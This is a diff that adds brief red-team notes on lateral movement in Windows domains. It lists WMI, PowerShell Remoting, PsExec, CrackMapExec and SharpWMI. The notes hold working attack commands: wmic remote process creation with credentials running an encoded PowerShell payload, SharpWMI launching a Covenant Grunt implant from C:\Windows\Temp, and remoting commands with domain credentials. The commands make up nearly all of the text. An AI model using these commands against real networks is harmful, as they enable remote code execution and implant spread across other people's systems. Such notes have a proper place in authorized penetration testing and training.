@@ -1,0 +1,23 @@
+#Lateral Movement
+
+Windows Management Instrumentation (WMI) Covenant: 
+WMI 
+wmigrunt computer powershell user password
+wmic /node:"wkstn-4945" /user:"domain\user" /password:"REDACTED" process call create "powershell -enc [...snip...]"
+ReturnValue = 0; "Successful"
+PowerShell Remoting
+PsExec
+Crackmapexec
+
+SharpWMI
+SharpWMI /command:"action=exec computername=computer command=\"C:\Windows\Temp\GruntHTTP.exe\""
+
+#PowerShell Remoting
+PowerShellRemotingCommand target "whoami; hostname"
+PowerShellRemotingCommand target "whoami; hostname" domain user pass
+
+
+
+
+
+
